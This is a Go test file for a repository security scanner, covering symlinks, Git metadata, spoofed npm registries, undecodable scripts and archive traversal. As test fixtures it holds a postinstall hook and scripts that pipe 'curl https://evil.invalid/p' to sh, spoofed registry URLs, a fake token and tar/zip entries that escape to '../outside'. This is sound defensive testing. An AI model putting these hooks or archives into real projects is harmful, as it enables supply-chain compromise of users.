package scan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDirectorySymlinkScansSameContent(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
	link := filepath.Join(t.TempDir(), "repo")
	if err := os.Symlink(repo, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	directCoverage, directFindings := New(Options{}).Scan(context.Background(), repo)
	linkCoverage, linkFindings := New(Options{}).Scan(context.Background(), link)
	if !directCoverage.Complete || !linkCoverage.Complete || directCoverage.FilesScanned != linkCoverage.FilesScanned || !hasRule(directFindings, "PKG-001") || !hasRule(linkFindings, "PKG-001") {
		t.Fatalf("symlink scan differed: direct=%+v/%+v linked=%+v/%+v", directCoverage, directFindings, linkCoverage, linkFindings)
	}
}

func TestGitMetadataCannotReadExternalSymlink(t *testing.T) {
	repo := t.TempDir()
	private := filepath.Join(t.TempDir(), "private")
	if err := os.WriteFile(private, []byte("ghp_abcdefghijklmnopqrstuvwxyz1234567890"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(private, filepath.Join(repo, ".git", "config")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	coverage, findings := New(Options{}).Scan(context.Background(), repo)
	if coverage.Complete || coverage.BytesScanned != 0 || hasRule(findings, "SECRET-001") {
		t.Fatalf("external metadata was scanned or marked complete: %+v %+v", coverage, findings)
	}
}

func TestLinkedGitDirectoryIsIncomplete(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, "metadata/config", "[core]\n hooksPath = hooks\n")
	if err := os.Symlink("metadata", filepath.Join(repo, ".git")); err != nil {
		t.Skipf("directory symlink unavailable: %v", err)
	}
	coverage, _ := New(Options{}).Scan(context.Background(), repo)
	if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), "linked Git metadata") {
		t.Fatalf("linked Git metadata appeared complete: %+v", coverage)
	}
}

func TestGitMetadataUsesRepositoryLimits(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, ".git/config", strings.Repeat("x", 4096))
	writeFixture(t, repo, ".git/config.worktree", strings.Repeat("x", 4096))
	limits := DefaultLimits()
	limits.MaxFiles = 1
	limits.MaxFileBytes = 128
	coverage, _ := New(Options{Limits: limits}).Scan(context.Background(), repo)
	if coverage.Complete || coverage.FilesScanned > 1 || coverage.BytesScanned > 128 {
		t.Fatalf("Git metadata bypassed limits: %+v", coverage)
	}
}

func TestTrustedRegistryRequiresExactHTTPSHost(t *testing.T) {
	for _, line := range []string{
		"registry=https://registry.npmjs.org.evil.example/pkg",
		"registry=https://registry.npmjs.org@evil.example/pkg",
		"registry=https://evil.example/registry.npmjs.org/pkg",
		"registry=http://registry.npmjs.org/pkg",
		"registry=https://registry.npmjs.org:444/pkg",
		`"resolved": "https://registry.npmjs.org.evil.example/pkg"`,
	} {
		if onlyTrustedRegistry([]byte(line)) {
			t.Fatalf("spoofed registry trusted: %q", line)
		}
	}
	for _, line := range []string{"registry=https://registry.npmjs.org/pkg", `"resolved": "https://registry.npmjs.org/pkg"`} {
		if !onlyTrustedRegistry([]byte(line)) {
			t.Fatalf("official registry rejected: %q", line)
		}
	}
	repo := t.TempDir()
	writeFixture(t, repo, ".npmrc", "registry=https://registry.npmjs.org.evil.example/pkg\n")
	writeFixture(t, repo, "package-lock.json", `{"packages":{"":{"resolved":"https://registry.npmjs.org.evil.example/pkg"}}}`)
	coverage, findings := New(Options{}).Scan(context.Background(), repo)
	if !coverage.Complete || !hasRule(findings, "NPMRC-002") || !hasRule(findings, "LOCK-001") {
		t.Fatalf("spoofed registry was not detected: %+v %+v", coverage, findings)
	}
}

func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
	repo := t.TempDir()
	writeFixture(t, repo, "run.sh", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
	writeFixture(t, repo, "run", "#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n")
	if err := os.WriteFile(filepath.Join(repo, "launch.ps1"), []byte{0xff, 0xfe, 'i', 0, 'e', 0, 'x', 0}, 0o644); err != nil {
		t.Fatal(err)
	}
	coverage, _ := New(Options{}).Scan(context.Background(), repo)
	if coverage.Complete || len(coverage.Skipped) < 3 || !strings.Contains(strings.Join(coverage.Skipped, " "), "undecodable") {
		t.Fatalf("undecodable script reported complete: %+v", coverage)
	}
}

func TestArchiveLinkTraversalIsDetected(t *testing.T) {
	t.Run("tar-directory", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "../outside/", Typeflag: tar.TypeDir}); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar directory traversal missed: %+v", findings)
		}
	})
	t.Run("tar-symlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "link", Typeflag: tar.TypeSymlink, Linkname: "../outside"}); err != nil {
			t.Fatal(err)
		}
		body := []byte("payload")
		if err := w.WriteHeader(&tar.Header{Name: "link/payload.txt", Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(body); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar symlink traversal missed: %+v", findings)
		}
	})
	t.Run("tar-hardlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "outside", Typeflag: tar.TypeLink, Linkname: "../outside"}); err != nil {
			t.Fatal(err)
		}
		w.Close()
		os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644)
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar hardlink traversal missed: %+v", findings)
		}
	})
	t.Run("zip-symlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := zip.NewWriter(&buf)
		h := &zip.FileHeader{Name: "link"}
		h.SetMode(os.ModeSymlink | 0o777)
		entry, err := w.CreateHeader(h)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte("../outside")); err != nil {
			t.Fatal(err)
		}
		w.Close()
		os.WriteFile(filepath.Join(repo, "archive.zip"), buf.Bytes(), 0o644)
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("zip symlink traversal missed: %+v", findings)
		}
	})
}
